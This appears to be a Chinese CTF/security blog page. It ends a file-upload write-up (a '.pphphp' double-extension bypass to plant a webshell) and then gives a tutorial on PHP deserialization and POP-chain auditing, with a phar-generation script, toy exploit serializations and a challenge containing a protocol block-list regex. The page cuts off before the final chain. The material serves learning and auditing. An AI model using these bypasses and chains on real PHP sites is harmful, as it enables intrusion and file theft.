<h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><p>题如其名<br><img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/9X0@6@JN1EYWG4PW_VA-1024x549.png" alt=""><br>改成.pphphp就行<br>传马连上就成了。<br><img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/RV3UY_JIFFI8R7@FZNLGEH-1024x549.png" alt=""><br><img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/XZI_EVTER0A79IWK5J.png" alt=""><br>就结束了</p>
<hr>

        </div>
        
        
        
    </div>
</div>








    
<div class="card">
    
    <div class="card-content article ">
        
        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
            <div class="level-left">
                <time class="level-item has-text-grey" datetime="2020-03-18T10:35:21.000Z">2020-03-18</time>
                
                <div class="level-item">
                <a class="has-link-grey -link" href="/categories/web/">web</a>
                </div>
                
                
                <span class="level-item has-text-grey">
                    
                    
                    21 分钟 读完 (大约 3173 个字)
                </span>
                
                
            </div>
        </div>
        
        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
            
                <a class="has-link-black-ter" href="/2020/03/18/pop%E4%B8%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">从反序列化、POP链看PHP代码审计</a>
            
        </h1>
        <div class="content">
            <p>很长时间为php反序列化和pop链的各种题目所困惑，一直想系统地总结和巩固一下，于是就有了本文。文章以POP链、反序列化为切入点，希望详细论述一些代码审计的方法论。</p>
<p>先放上全文思路图</p>
<p><img src="https://ww1.yunjiexi.club/2020/03/16/GQtYq.png" alt=""></p>
<p>主要内容分为三个部分：</p>
<ol>
<li>前置知识补漏</li>
<li>漏洞利用链方法论</li>
<li>实践工具和技巧</li>
</ol>
<p><strong>基础知识参考文章</strong></p>
<p><a href="https://xz.aliyun.com/t/3674#toc-9">比较全面且基础的文章</a> 且讲解了session的序列化器不同引发的漏洞</p>
<p><a href="https://xz.aliyun.com/t/3336">从LCTF WEB签到题看PHP反序列化</a></p>
<p><a href="https://www.cnblogs.com/iamstudy/articles/php_unserialize_pop_2.html">php反序列化pop链一则</a></p>
<p><strong>比较困难的部分是实际的CMS审计</strong></p>
<p><a href="https://paper.seebug.org/1040/">Thinkphp 5.1.反序列化漏洞详解</a></p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="序列化和序列化"><a href="#序列化和序列化" class="headerlink" title="序列化和序列化"></a>序列化和序列化</h3><p>为了传输对象，我们把类变成一个有结构的字符串，就称为序列化。把这个字符串变为原来的对象，就称为反序列化。我们只能保存对象的属性，而不能保存对象的方法。</p>
<p>为了能够unserialize()一个对象，这个对象的类必须已经定义过，传统编程需要很多include和require。后来出现了autoloading技术，自动导入使用的类。</p>
<p>要提一下Composer,这是一个php的包管理工具,同时他还能自动导入依赖库中定义的类。这样一来 unserialize() 函数也就能使用所有依赖库中的类了,攻击面增大不少。</p>
<ol>
<li>Composer配置的依赖库存储在vendor目录下</li>
<li>如果要使用Composer的自动类加载机制,只需要在php文件的开头加上<code>require DIR . &#39;/vendor/autoload.php&#39;;</code></li>
</ol>
<p><strong>反序列化的漏洞</strong>：CVE-2016-7124</p>
<p>触发该漏洞的PHP版本为PHP5小于5.6.25或PHP7小于7.0.10。当序列化字符串中表示对象个数的值大于真实的属性个数时，会跳过__wakeup()的执行。</p>
<h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><p>魔术方法是在一定情况下会被类自动调用的方法。我们经常通过控制属性，到达一些魔术方法，进而一步步到达漏洞函数。下面列出了方法和被调用的时机</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() <span class="comment">//使用unserialize时触发</span></span><br><span class="line">__sleep() <span class="comment">//使用serialize时触发</span></span><br><span class="line">__destruct() <span class="comment">//对象被销毁时触发</span></span><br><span class="line">__call() <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line">__callStatic() <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line">__get() <span class="comment">//用于从不可访问(不存在)的属性读取数据</span></span><br><span class="line">__set() <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line">__isset() <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line">__unset() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line">__toString() <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line">__invoke() <span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure>

<h3 id="Phar"><a href="#Phar" class="headerlink" title="Phar"></a>Phar</h3><p>参考资料：</p>
<ul>
<li><a href="https://paper.seebug.org/680/">phar详解+稍复杂利用实例</a> from seebug</li>
</ul>
<p>PHAR (“Php ARchive”) 是PHP里类似于JAR的一种打包文件。phar文件会以序列化的形式存储用户自定义的meta-data，这使得文件函数读取phar格式的文件时，就会触发unserialize。这样子我们就相当于利用好多文件操作函数，达到了unserialize函数的目的。下面是受到影响的文件操作函数，非常多。</p>
<p><img src="https://images.seebug.org/content/images/2018/08/17c4c630-b5f7-4e02-af48-160cd8fcf73a.png-w331s" alt=""></p>
<p>但phar也有利用的条件：</p>
<ol>
<li>phar文件要能够上传到服务器端。</li>
<li>要有可用的魔术方法作为“跳板”。</li>
<li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</li>
</ol>
<p>下面简单介绍Phar格式的结构：</p>
<p><img src="https://ww1.yunjiexi.club/2020/03/15/GGiUt.png" alt=""></p>
<p>四部分。首先是<strong>标志位</strong>：格式为<code>xxx</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。前面内容不限，因此我们经常可以文件头伪造。</p>
<p>接下来是<strong>menifest</strong>，phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以<em>序列化</em>的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p>
<p><img src="https://images.seebug.org/content/images/2018/08/24388aaa-6ea4-4856-8fb1-fbf29deb5dca.png-w331s" alt=""></p>
<p>再接下是被压缩文件的内容，无关紧要。</p>
<p>最后是签名，放在文件末尾。</p>
<p><img src="https://images.seebug.org/content/images/2018/08/f87194d9-81d6-4786-9339-8a7d4ac596d5.png-w331s" alt=""></p>
<p>生成phar文件的脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyObject</span> </span>&#123;</span><br><span class="line">        <span class="comment">//你的逻辑</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    $phar-&gt;setStub("GIF89a"."&lt;?php __HALT_COMPILER();?&gt;");</span></span><br><span class="line"><span class="comment">    这样也完全没问题</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    </span><br><span class="line">    $o = <span class="keyword">new</span> MyObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件，注意！不添加会导致无法生成phar</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>调用也很容易</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$filename = <span class="string">'phar://phar.phar/a_random_string'</span>;</span><br><span class="line">    file_exists($filename);<span class="comment">//文件函数即可</span></span><br></pre></td></tr></table></figure>

<h3 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h3><p>在通常的PHP开发中，除了使用自己的代码以外，往往会使用很多其他的PHP组件。这些组件代码可能会使用相同的类名、接口名、函数或者常量名等，如果不使用命名空间就会导致命名冲突，使PHP执行出错。而将代码放到各自唯一的命名空间中，我们的代码就可以和其他开发者使用相同的类名、接口名、函数或者常量名等。</p>
<p>我们只要知道，在构造利用类时，顺便加上它所在的命名空间就好了。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">mainspace</span>/<span class="title">subspace</span>;</span><br></pre></td></tr></table></figure>

<p>还要注意的是，在命名空间中使用全局类，需要在类名前加上<code>/</code>符，否则会出错。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">A</span>\<span class="title">B</span>\<span class="title">C</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exception</span> <span class="keyword">extends</span> \<span class="title">Exception</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'hi'</span>); <span class="comment">// $a 是类 A\B\C\Exception 的一个对象</span></span><br><span class="line">$b = <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'hi'</span>); <span class="comment">// $b 是类 Exception 的一个对象</span></span><br><span class="line"></span><br><span class="line">$c = <span class="keyword">new</span> ArrayObject; <span class="comment">// 致命错误, 找不到 A\B\C\ArrayObject 类</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="漏洞利用链方法论"><a href="#漏洞利用链方法论" class="headerlink" title="漏洞利用链方法论"></a>漏洞利用链方法论</h2><p>先阐述很重要的POP链利用，然后介绍一般的漏洞利用方法。</p>
<h3 id="POP链实例"><a href="#POP链实例" class="headerlink" title="POP链实例"></a>POP链实例</h3><p>如果直接介绍POP链的定义，相信会很抽象，很难理解。我们先通过简单的例子感性认识一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;name == <span class="string">"admin"</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"\nflag&#123;This_is_flag&#125;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Group</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $user;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Coll</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $group;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这是三个类的定义，它们是递进依赖的关系。接下来在代码中添加以下几行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//声明</span></span><br><span class="line">$c = <span class="keyword">new</span> User();</span><br><span class="line">$b = <span class="keyword">new</span> Group();</span><br><span class="line">$a = <span class="keyword">new</span> Coll();</span><br><span class="line"><span class="comment">//利用</span></span><br><span class="line">$c-&gt;name = <span class="string">"admin"</span>;</span><br><span class="line">$b-&gt;user = $c;</span><br><span class="line">$a-&gt;group = $b;</span><br><span class="line"><span class="comment">//获得exp</span></span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>

<p>输出了<code>O:4:&quot;Coll&quot;:1:{s:5:&quot;group&quot;;O:5:&quot;Group&quot;:1:{s:4:&quot;user&quot;;O:4:&quot;User&quot;:1:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;}}}</code>和应有的flag（因为执行完脚本自动destruct）。而如果转而添加以下几行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$string = <span class="string">'O:4:"Coll":1:&#123;s:5:"group";O:5:"Group":1:&#123;s:4:"user";O:4:"User":1:&#123;s:4:"name";s:5:"admin";&#125;&#125;&#125;'</span>;</span><br><span class="line">$Coll = unserialize($string);</span><br></pre></td></tr></table></figure>

<p>也可以得到flag，这就是一次简单的POP链利用过程了。</p>
<h3 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h3><p>POP是面向属性编程的意思。在以上操作中，我们利用unserialize函数，控制了一些相互依赖的对象的属性。</p>
<p>unserialize函数上面已经讲过了，它的本质是：<strong>控制了对象的所有属性</strong>，即使这个属性是另一个对象，也可以控制。</p>
<p>为了做到控制某个属性，控制了一层又一层的对象，连起来像链条一样。就如上例，我们<strong>意图</strong>是控制<code>name</code>，为了演示，通过<code>Coll-&gt;Group-&gt;User-&gt;name</code>进行了控制。这就是POP链的构造。其实很简单。</p>
<h3 id="相同函数名的漏洞利用"><a href="#相同函数名的漏洞利用" class="headerlink" title="相同函数名的漏洞利用"></a>相同函数名的漏洞利用</h3><p>这是一个扩展利用链的方法。</p>
<p>有时候漏洞函数在一个类的普通方法中，我们正常是做不到以可控变量访问此方法的。这个时候我们可以通过可以控制的类，与漏洞函数所在方法同名的方法来执行。例子如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $classObj;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;classObj = <span class="keyword">new</span> Accessable();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;classObj-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NotAccessable</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"flag&#123;this_is_flag&#125;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Accessable</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"flag is not here"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意到action方法重名，可以构造exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $classObj;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;classObj = <span class="keyword">new</span> NotAccessable();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NotAccessable</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str = serialize(<span class="keyword">new</span> Main());</span><br><span class="line"><span class="keyword">echo</span> $str;<span class="comment">// O:4:"Main":1:&#123;s:8:"classObj";O:13:"NotAccessable":0:&#123;&#125;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到成功执行。</p>
<p><img src="https://ww1.yunjiexi.club/2020/03/16/GQmWE.png" alt=""></p>
<h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><p>在代码审计的过程中，我们穿越在复杂的逻辑迷宫里。当我们发现了漏洞函数，一点点的观察：哪里调用了这个函数？可不可以最终控制函数的参数？一点点地溯源下去，最终发现了我们可以控制的输入点。在此过程中，用到的函数层层调用像链条一样连接起来，便是利用链。</p>
<p>我认为利用链有三要素：可控点，中间过滤，利用点。</p>
<p>可控点和利用点都很容易理解，重要的是中间过滤，我们常常需要把这些过滤记下来，在可控点进行bypass。利用点决定了我们能<strong>做什么</strong>，中间过滤决定了要<strong>怎么做</strong>，而可控点则是点出了我们<strong>在哪做</strong>。实际操作的时候，我们只要明确这三个问题，就不会迷失方向。</p>
<h2 id="实践与技巧"><a href="#实践与技巧" class="headerlink" title="实践与技巧"></a>实践与技巧</h2><p>如果利用链可以从<strong>谁能调用我？</strong>和<strong>我能调用谁？</strong>两个角度出发，从后往前+从前往后一起遍历，最后中间相遇。</p>
<p>审计CMS时，则往往是从类中寻找可以利用的漏洞，然后直接全局寻找能够触发unserialize的代码。</p>
<h3 id="中规中矩的题目"><a href="#中规中矩的题目" class="headerlink" title="中规中矩的题目"></a>中规中矩的题目</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line">error_reporting(<span class="number">1</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));<span class="comment">//[TARGET 1]</span></span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;file_get(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">        <span class="keyword">echo</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source.<span class="string">'Welcome'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str[<span class="string">'str'</span>]-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/gopher|http|ftp|https|dict|\.\.|flag|file/i'</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source); <span class="comment">//[TARGET 2]</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'hello'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    unserialize($_GET[<span class="string">'hello'</span>]);<span class="comment">//[START]</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $show = <span class="keyword">new</span> Show(<span class="string">'pop3.php'</span>);</span><br><span class="line">    $show-&gt;_show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我标注了target的两处便是最终要利用的函数，start的一处就是我们可控输入点。</p>
<p>先逆推考察Target 1</p>
<p>如何到达最后的<code>file_get_content(可控)</code>？需要到达<code>file_get(可控)</code>，需要<code>__invoke()且$var可控</code>。如何调用invoke？需要把对象当做函数调用。于是我们就要寻找办法做到这一点：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">... 把一个Read()的对象作为函数调用且可控$var -&gt; __invoke() 且可控$var -&gt; file_get(可控) -&gt; file_get_content(可控)【Finish】</span><br></pre></td></tr></table></figure>

<p>哪里可以函数调用对象？当然是<code>Test-&gt;__get()</code>。<code>__get()</code>可用于从不存在的属性读取数据，那么哪里可以调用get？不太好找了。我们先放一放</p>
<p>再从start顺推考察。<code>unserialize()</code>会调用<code>__wakeup</code>方法，且类一切参数可控。而<code>Show-&gt;__wakeup()</code>中的preg_match会调用类的<code>toString</code>，Show类中恰有toString。跟进方法，发现它想要获得类的属性，那就有可能出现属性不存在的问题。这个过程如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">【Start】-&gt;unserialize(对象属性全可控) -&gt; Show的wakeup()且source可控 -&gt; Show的source的toString且source可控 -&gt; Show的source的str[&#39;str&#39;]的__get()方法 -&gt; ...</span><br></pre></td></tr></table></figure>

<p>至此，我们发现前后已经连接上了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">【Start】-&gt;unserialize() -&gt; Show的wakeup() -&gt; Show的source的toString -&gt; Show的source的str[&#39;str&#39;]的__get() -&gt; 函数调用了Read()的一个对象 -&gt;Read的__invoke()  -&gt; file_get() -&gt; file_get_content()【Finish】</span><br></pre></td></tr></table></figure>

<p>那么就可以构造POP链：</p>
